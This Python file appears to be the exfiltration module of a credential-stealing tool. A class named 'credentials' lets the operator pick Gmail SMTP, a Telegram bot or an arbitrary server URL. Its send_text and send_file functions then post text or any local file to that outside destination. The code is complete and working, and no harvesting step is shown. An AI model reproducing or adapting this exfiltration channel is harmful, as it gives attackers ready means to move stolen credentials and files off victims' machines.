import time
import random
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import requests
import os

# 7/17/2025
# AUX-441
# Main Code


class credentials:
    def __init__(self):
        self.method = None
        self.config = {}

    def Choice_Method_to_send(self):
        print("[1] Send to Email")
        print("[2] Send from Telegram Bot")
        print("[3] Send From Server")
        time.sleep(random.randint(1, 3))
        User_Choice = int(input("Choice Method : "))

        if User_Choice == 1:
            self.method = "email"
            self.config["sender"] = input("Enter (Sender) Email : ")
            self.config["password"] = input("Enter Sender (APP Password) : ")
            self.config["receiver"] = input("Enter (Receiver) Email : ")

        elif User_Choice == 2:
            self.method = "telegram"
            self.config["bot_token"] = input("Enter Telegram Bot Token : ")
            self.config["chat_id"] = input("Enter Chat ID : ")

        elif User_Choice == 3:
            self.method = "server"
            self.config["url"] = input("Enter Server URL : ")

        else:
            print("Invalid Choice")

    def send_text(self, subject, body):
        if self.method == "email":
            msg = MIMEText(body, "plain")
            msg["Subject"] = subject
            msg["From"] = self.config["sender"]
            msg["To"] = self.config["receiver"]

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.config["sender"], self.config["password"])
                server.sendmail(self.config["sender"], self.config["receiver"], msg.as_string())
            print("[+] Email text sent!")

        elif self.method == "telegram":
            url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendMessage"
            payload = {"chat_id": self.config["chat_id"], "text": body}
            requests.post(url, data=payload)
            print("[+] Telegram text sent!")

        elif self.method == "server":
            data = {"subject": subject, "body": body}
            requests.post(self.config["url"], json=data)
            print("[+] Sent to server!")

    def send_file(self, filepath, subject="File"):
        if not os.path.exists(filepath):
            print("[-] File not found:", filepath)
            return

        if self.method == "email":
            msg = MIMEMultipart()
            msg["Subject"] = subject
            msg["From"] = self.config["sender"]
            msg["To"] = self.config["receiver"]

            part = MIMEBase("application", "octet-stream")
            part.set_payload(open(filepath, "rb").read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(filepath)}")
            msg.attach(part)

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.config["sender"], self.config["password"])
                server.sendmail(self.config["sender"], self.config["receiver"], msg.as_string())
            print(f"[+] Email file sent: {filepath}")

        elif self.method == "telegram":
            url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendDocument"
            files = {"document": open(filepath, "rb")}
            payload = {"chat_id": self.config["chat_id"]}
            requests.post(url, data=payload, files=files)
            print(f"[+] Telegram file sent: {filepath}")

        elif self.method == "server":
            files = {"file": open(filepath, "rb")}
            requests.post(self.config["url"], files=files)
            print(f"[+] Sent file to server: {filepath}")
